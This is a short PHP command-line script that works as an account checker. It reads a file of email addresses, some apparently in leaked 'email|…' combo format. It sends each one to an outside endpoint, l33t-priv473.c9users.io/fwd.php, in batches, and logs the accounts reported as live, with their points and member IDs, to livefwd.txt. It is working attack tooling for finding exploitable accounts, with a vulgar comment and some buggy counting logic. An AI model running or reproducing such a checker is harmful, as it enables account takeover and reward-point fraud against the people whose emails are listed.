<?php
@require_once("curl.php");
$o = 0; $a = 0;
$arr =  array("\r","	"," ");
echo "?File		";
$file = trim(fgets(STDIN));
//if(!file_exists($file)) exit("Kontol\n");
$file = @explode("\n",str_replace($arr,"",@file_get_contents($file)));
$count = count($file);
if($count>10) $counts = $count/5;
if(stripos($counts,".")) $counts = @explode(".",$count)[0]+1;
echo "\n\nTotal Email : $count\n\n";
while($o<$counts){
	$url = array();
	$i = $a+5;
	if($count<5) $i = $count;
	while($a<$i){
		$email = @$file[$a];
		if(empty($email)) $a++;
		if(strpos($email,'|')) $email = @explode('|',$email)[0];
		$url[$email] = "http://l33t-priv473.c9users.io/fwd.php?email=$email";
		$a++;
	}
	$MCurl->setUrls($url);
	$data = $MCurl->getResults();
	foreach($data as $key => $value){
		if(!stripos($key,"@")) continue;
		$val = json_decode($value,true)['info'];
		if(@$val['status']){
			$asw = "LIVE | $key | {$val['point']} | {$val['memberId']}\n";
			@file_put_contents("livefwd.txt", "$asw\n", FILE_APPEND);
			echo $asw;
		}else
		if(@$val['status']==false){
			echo "DIE | $key\n";
		}else{
			echo "UNK | $key\n";
		}
		usleep(5000);
	}
	unset($url);
	$o++;
	if($a>=$count) break;
}